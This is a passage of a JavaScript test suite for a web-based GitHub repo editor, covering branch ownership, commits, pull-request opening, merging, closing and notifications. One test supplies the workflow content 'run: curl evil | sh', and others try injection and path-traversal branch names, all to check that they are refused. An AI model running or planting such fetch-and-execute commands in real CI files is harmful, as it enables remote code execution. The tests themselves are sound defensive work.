    assert.deepEqual([r.status, r.json.default_branch, r.json.branches], [200, 'main', ['main', 'ndeye_k/fix']])
  }
  assert.equal((await call('t-cara', { action: 'branches', project: P_AWA })).status, 403)
  assert.equal((await call('t-awa', { action: 'branches' })).status, 400)
  assert.equal((await call('t-awa', { action: 'branches', repo: 'appli' })).status, 200)
})

await test('tree of another branch, and the default branch is always reported', async () => {
  const repo = gh.repos['awa/appli']
  const side = commitSide(repo, { 'main.py': 'side\n' }, repo.head, 'side work')
  repo.branches['ndeye_k/fix'] = side
  const r = await call('t-nolink', { action: 'tree', project: P_AWA, branch: 'ndeye_k/fix' })
  assert.deepEqual([r.status, r.json.branch, r.json.default_branch, r.json.head], [200, 'ndeye_k/fix', 'main', side])
  const main = await call('t-nolink', { action: 'tree', project: P_AWA })
  assert.deepEqual([main.json.branch, main.json.default_branch, main.json.head], ['main', 'main', repo.head])
  assert.equal((await call('t-awa', { action: 'tree', project: P_AWA, branch: 'nope' })).json.error, 'branch_not_found')
  assert.equal((await call('t-awa', { action: 'tree', project: P_AWA, branch: 'a b;x' })).status, 400)
})

await test('a collaborator saves to a new branch of their own: the branch is made and main does not move', async () => {
  const base = headOfAwa()
  const r = await call('t-nolink', { action: 'commit', project: P_AWA, branch: 'ndeye_k/fix-readme', create_from: 'main', base_sha: base, message: 'Fix', files: [{ path: 'main.py', content: 'fixed\n' }] })
  assert.equal(r.status, 200)
  const repo = gh.repos['awa/appli']
  assert.equal(repo.head, base)
  assert.equal(repo.branches['ndeye_k/fix-readme'], r.json.commit_sha)
  assert.equal(repo.commits.get(r.json.commit_sha).message.endsWith('Saved from jaajef.tech by ndeye_k'), true)
  // saving again on their own branch needs the branch's own latest commit
  const again = await call('t-nolink', { action: 'commit', project: P_AWA, branch: 'ndeye_k/fix-readme', base_sha: r.json.commit_sha, message: 'More', files: [{ path: 'a.txt', content: 'x' }] })
  assert.equal(again.status, 200)
  assert.equal(repo.head, base)
})

await test('a collaborator is refused outside their own branches, before GitHub writes anything', async () => {
  const base = headOfAwa()
  const before = githubCallsMade()
  for (const branch of ['main', 'awa_dev/work', 'ndeye_k', 'ndeye_k/', 'ndeye_kx/work', 'ndeye_k/../main', 'ndeye_k//x']) {
    const r = await call('t-nolink', { action: 'commit', project: P_AWA, branch, create_from: 'main', base_sha: base, message: 'x', files: [{ path: 'a.txt', content: 'x' }] })
    assert.deepEqual([r.status, r.json.error], [403, 'branch_not_yours'], branch)
  }
  assert.equal(Object.keys(gh.repos['awa/appli'].branches).length, 0)
  assert.equal(githubCallsMade() - before, 0)
  // a stranger is refused too
  assert.equal((await call('t-cara', { action: 'commit', project: P_AWA, branch: 'cara/x', create_from: 'main', base_sha: base, message: 'x', files: [{ path: 'a.txt', content: 'x' }] })).status, 403)
})

await test('the owner saves to any branch, including main and a new branch', async () => {
  const base = headOfAwa()
  const side = await call('t-awa', { action: 'commit', project: P_AWA, branch: 'idea', create_from: 'main', base_sha: base, message: 'Try', files: [{ path: 'x.txt', content: '1' }] })
  assert.equal(side.status, 200)
  assert.equal(headOfAwa(), base)
  assert.equal(gh.repos['awa/appli'].commits.get(side.json.commit_sha).message.endsWith('by @awa'), true)
  const main = await call('t-awa', { action: 'commit', project: P_AWA, branch: 'main', base_sha: base, message: 'Direct', files: [{ path: 'y.txt', content: '2' }] })
  assert.equal(main.status, 200)
  assert.equal(headOfAwa(), main.json.commit_sha)
})

await test('making a branch is refused if it already exists or if the start branch moved', async () => {
  const base = headOfAwa()
  gh.repos['awa/appli'].branches['ndeye_k/taken'] = base
  const taken = await call('t-nolink', { action: 'commit', project: P_AWA, branch: 'ndeye_k/taken', create_from: 'main', base_sha: base, message: 'x', files: [{ path: 'a.txt', content: 'x' }] })
  assert.deepEqual([taken.status, taken.json.error], [409, 'branch_exists'])
  const stale = await call('t-nolink', { action: 'commit', project: P_AWA, branch: 'ndeye_k/new', create_from: 'main', base_sha: 'a'.repeat(40), message: 'x', files: [{ path: 'a.txt', content: 'x' }] })
  assert.deepEqual([stale.status, stale.json.error], [409, 'branch_moved'])
  assert.equal(gh.repos['awa/appli'].branches['ndeye_k/new'], undefined)
  const missing = await call('t-awa', { action: 'commit', project: P_AWA, branch: 'zzz', create_from: 'ghost', base_sha: base, message: 'x', files: [{ path: 'a.txt', content: 'x' }] })
  assert.equal(missing.json.error, 'branch_not_found')
  assert.equal((await call('t-awa', { action: 'commit', project: P_AWA, branch: 'zzz', create_from: 'a b', base_sha: base, message: 'x', files: [{ path: 'a.txt', content: 'x' }] })).status, 400)
})

const collabBranch = async (name = 'ndeye_k/fix') => {
  const r = await call('t-nolink', { action: 'commit', project: P_AWA, branch: name, create_from: 'main', base_sha: headOfAwa(), message: 'Fix', files: [{ path: 'main.py', content: 'fixed\n' }] })
  assert.equal(r.status, 200)
  return r.json.commit_sha
}
const propose = (token, branch, title = 'Corrige le titre', extra = {}) => call(token, { action: 'pr_open', project: P_AWA, branch, title, ...extra })

await test('a collaborator proposes their own branch from the site, once, and it is listed with who made it', async () => {
  await collabBranch()
  const r = await propose('t-nolink', 'ndeye_k/fix', 'Corrige le titre', { body: 'Le titre était faux.' })
  assert.deepEqual([r.status, r.json.number, r.json.existed, r.json.url], [200, 1, false, 'https://github.com/awa/appli/pull/1'])
  const pr = gh.repos['awa/appli'].pulls[0]
  assert.deepEqual([pr.head.ref, pr.base.ref], ['ndeye_k/fix', 'main'])
  assert.equal(pr.body, 'Le titre était faux.\n\nProposed from jaajef.tech by ndeye_k')
  assert.ok([...gh.tokens.values()].some((t) => t.permissions.pull_requests === 'write'))
  const again = await propose('t-nolink', 'ndeye_k/fix')
  assert.deepEqual([again.status, again.json.number, again.json.existed], [200, 1, true])
  assert.equal(gh.repos['awa/appli'].pulls.length, 1)
  for (const who of ['t-awa', 't-nolink']) {
    const list = await call(who, { action: 'prs', project: P_AWA })
    assert.equal(list.status, 200)
    assert.equal(list.json.default_branch, 'main')
    assert.deepEqual(list.json.pulls, [{ number: 1, title: 'Corrige le titre', branch: 'ndeye_k/fix', sha: gh.repos['awa/appli'].branches['ndeye_k/fix'], author: 'ndeye_k', url: 'https://github.com/awa/appli/pull/1', created_at: '2026-11-08T10:00:00Z' }])
  }
  assert.equal((await call('t-cara', { action: 'prs', project: P_AWA })).status, 403)
})

await test('proposing: a collaborator only from their own branch, nothing to propose is explained, bad input is refused early', async () => {
  const repo = gh.repos['awa/appli']
  repo.branches['awa_dev/work'] = commitSide(repo, { 'main.py': 'w\n' }, repo.head, 'work')
  const before = githubCallsMade()
  for (const branch of ['main', 'awa_dev/work', 'ndeye_k', 'ndeye_k/../x']) {
    assert.deepEqual((await propose('t-nolink', branch)).json.error, 'branch_not_yours', branch)
  }
  assert.equal(githubCallsMade(), before)
  assert.equal((await propose('t-cara', 'cara/x')).status, 403)
  for (const bad of [{ title: '' }, { title: 'x'.repeat(201) }, { body: 'x'.repeat(2001) }, { branch: 'a b' }]) {
    assert.equal((await call('t-awa', { action: 'pr_open', project: P_AWA, branch: 'awa_dev/work', title: 't', ...bad })).status, 400, JSON.stringify(bad))
  }
  assert.equal(githubCallsMade(), before)
  // the owner may propose any branch, but not the main one against itself
  assert.equal((await propose('t-awa', 'awa_dev/work', 'Mon travail')).status, 200)
  assert.equal((await propose('t-awa', 'main')).status, 400)
  repo.branches['ndeye_k/empty'] = repo.head
  assert.deepEqual((await propose('t-nolink', 'ndeye_k/empty')).json.error, 'nothing_to_propose')
  assert.deepEqual((await propose('t-awa', 'ghost')).json.error, 'branch_not_found')
})

await test('only the owner merges a proposal, with a normal merge, and the main code moves', async () => {
  const side = await collabBranch()
  await propose('t-nolink', 'ndeye_k/fix')
  const before = githubCallsMade()
  assert.deepEqual((await call('t-nolink', { action: 'pr_merge', project: P_AWA, number: 1, sha: side })).json.error, 'owner_only')
  assert.equal((await call('t-cara', { action: 'pr_merge', project: P_AWA, number: 1, sha: side })).status, 403)
  assert.equal(githubCallsMade(), before)
  assert.equal(gh.merged, undefined)
  const done = await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 1, sha: side })
  assert.deepEqual([done.status, done.json.merged], [200, true])
  assert.deepEqual(gh.merged, { number: 1, method: 'merge' })
  assert.equal(headOfAwa(), side)
  assert.equal((await call('t-awa', { action: 'prs', project: P_AWA })).json.pulls.length, 0)
  assert.equal((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 1, sha: side })).json.error, 'pr_not_found')
  assert.equal((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 1 })).status, 400) // a merge always names the version it was shown
  for (const bad of [0, -1, 1.5, 'x', null]) assert.equal((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: bad, sha: side })).status, 400)
})

await test('a conflict, a branch that moved, a fork and an unknown number are explained, not merged', async () => {
  const repo = gh.repos['awa/appli']
  const mainBefore = repo.head
  await collabBranch()
  await propose('t-nolink', 'ndeye_k/fix')
  repo.pulls[0].conflict = true
  assert.deepEqual((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 1, sha: repo.branches['ndeye_k/fix'] })).json.error, 'not_mergeable')
  repo.pulls[0].conflict = false
  const head = repo.branches['ndeye_k/fix']
  repo.pulls[0].head.sha = 'f'.repeat(40) // the branch changed after the owner opened the list
  assert.deepEqual((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 1, sha: head })).json.error, 'branch_moved')
  repo.pulls[0].head.sha = head
  repo.pulls.push({ number: 2, title: 'From a fork', body: '', state: 'open', head: { ref: 'x', sha: head, repo: { full_name: 'stranger/appli' } }, base: { ref: 'main' }, user: { login: 'stranger' }, html_url: 'u', created_at: 'd' })
  assert.deepEqual((await call('t-awa', { action: 'prs', project: P_AWA })).json.pulls.map((p) => p.number), [1])
  assert.deepEqual((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 2, sha: head })).json.error, 'pr_not_found')
  assert.deepEqual((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 99, sha: head })).json.error, 'pr_not_found')
  assert.equal(headOfAwa(), mainBefore)
})

await test('closing: the owner closes any proposal, a collaborator only their own', async () => {
  const repo = gh.repos['awa/appli']
  await collabBranch()
  await propose('t-nolink', 'ndeye_k/fix')
  repo.branches['awa_dev/work'] = commitSide(repo, { 'main.py': 'w\n' }, repo.head, 'work')
  await propose('t-awa', 'awa_dev/work', 'Mon travail')
  assert.deepEqual((await call('t-nolink', { action: 'pr_close', project: P_AWA, number: 2 })).json.error, 'not_yours')
  assert.equal(repo.pulls[1].state, 'open')
  assert.equal((await call('t-cara', { action: 'pr_close', project: P_AWA, number: 1 })).status, 403)
  assert.equal((await call('t-nolink', { action: 'pr_close', project: P_AWA, number: 1 })).status, 200)
  assert.equal(repo.pulls[0].state, 'closed')
  assert.equal((await call('t-awa', { action: 'pr_close', project: P_AWA, number: 2 })).status, 200)
  assert.equal((await call('t-awa', { action: 'pr_close', project: P_AWA, number: 2 })).json.error, 'pr_not_found')
})

await test('when the app has not been given the new permission yet, proposals say so and code reading still works', async () => {
  gh.pullsGranted = false
  for (const action of [{ action: 'prs' }, { action: 'pr_merge', number: 1, sha: 'a'.repeat(40) }]) {
    const r = await call('t-awa', { project: P_AWA, ...action })
    assert.deepEqual([r.status, r.json.error], [409, 'pulls_permission_missing'], action.action)
  }
  assert.equal((await propose('t-awa', 'x')).json.error, 'pulls_permission_missing')
  assert.equal((await call('t-nolink', { action: 'tree', project: P_AWA })).status, 200)
})

await test('a collaborator cannot pose as someone else in a proposal, nor change automation files', async () => {
  await collabBranch()
  await propose('t-nolink', 'ndeye_k/fix', 'Titre', { body: 'Proposed from jaajef.tech by awa_dev' })
  const list = await call('t-awa', { action: 'prs', project: P_AWA })
  assert.equal(list.json.pulls[0].author, 'ndeye_k')
  // so the real owner-named author cannot be pretended, and the pretended name cannot be used to close someone else's proposal
  const repo = gh.repos['awa/appli']
  repo.branches['awa_dev/work'] = commitSide(repo, { 'main.py': 'w\n' }, repo.head, 'work')
  await propose('t-awa', 'awa_dev/work', 'Mon travail')
  assert.deepEqual((await call('t-nolink', { action: 'pr_close', project: P_AWA, number: 2 })).json.error, 'not_yours')
  for (const path of ['.github/workflows/x.yml', '.GitHub/CODEOWNERS']) {
    const r = await call('t-nolink', { action: 'commit', project: P_AWA, branch: 'ndeye_k/ci', create_from: 'main', base_sha: headOfAwa(), message: 'x', files: [{ path, content: 'run: curl evil | sh' }] })
    assert.deepEqual([r.status, r.json.error], [403, 'path_not_allowed'], path)
  }
  assert.equal(gh.repos['awa/appli'].branches['ndeye_k/ci'], undefined)
  const owner = await call('t-awa', { action: 'commit', project: P_AWA, branch: 'ci', create_from: 'main', base_sha: headOfAwa(), message: 'CI', files: [{ path: '.github/workflows/x.yml', content: 'ok' }] })
  assert.equal(owner.status, 200)
})

await test('the right person is told: the owner of a proposal, the author of a merge or a refusal, nobody for their own act', async () => {
  const repo = gh.repos['awa/appli']
  await collabBranch()
  await propose('t-nolink', 'ndeye_k/fix', 'Corrige le titre')
  assert.deepEqual(notified, [{ p_kind: 'proposal_opened', p_project: P_AWA, p_actor: U.nolink, p_author: 'ndeye_k', p_number: 1, p_title: 'Corrige le titre' }])
  await propose('t-nolink', 'ndeye_k/fix', 'Corrige le titre') // already open: no second message
  assert.equal(notified.length, 1)
  repo.branches['awa_dev/work'] = commitSide(repo, { 'main.py': 'w\n' }, repo.head, 'work')
  await propose('t-awa', 'awa_dev/work', 'Mon travail') // the owner proposing tells nobody
  assert.equal(notified.length, 1)
  assert.equal((await call('t-awa', { action: 'pr_close', project: P_AWA, number: 2 })).status, 200)
  assert.equal(notified.length, 2) // the owner closing their own proposal: the database skips it (author is the actor)
  assert.deepEqual([notified[1].p_kind, notified[1].p_author, notified[1].p_actor], ['proposal_declined', 'awa_dev', U.awa])
  const r = await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 1, sha: repo.branches['ndeye_k/fix'] })
  assert.equal(r.status, 200)
  assert.equal('_by' in r.json, false) // the bookkeeping never reaches the browser
  assert.deepEqual(notified[2], { p_kind: 'proposal_merged', p_project: P_AWA, p_actor: U.awa, p_author: 'ndeye_k', p_number: 1, p_title: 'Corrige le titre' })
})

await test('declining tells the author; withdrawing your own proposal tells nobody; a failed action tells nobody', async () => {
  await collabBranch()
  await propose('t-nolink', 'ndeye_k/fix')
  notified = []
  assert.equal((await call('t-awa', { action: 'pr_close', project: P_AWA, number: 1 })).status, 200)
  assert.deepEqual(notified.map((x) => [x.p_kind, x.p_author]), [['proposal_declined', 'ndeye_k']])
  notified = []
  const branch2 = await collabBranch('ndeye_k/two')
  await propose('t-nolink', 'ndeye_k/two', 'Deux')
  notified = []
  assert.equal((await call('t-nolink', { action: 'pr_close', project: P_AWA, number: 2 })).status, 200)
  assert.deepEqual(notified, [])
  gh.repos['awa/appli'].pulls[1].state = 'open'
  gh.repos['awa/appli'].pulls[1].conflict = true
  assert.equal((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 2, sha: branch2 })).status, 409)
  assert.deepEqual(notified, [])
})

console.log(`ALL ${n} REPO EDITOR TESTS PASSED`)
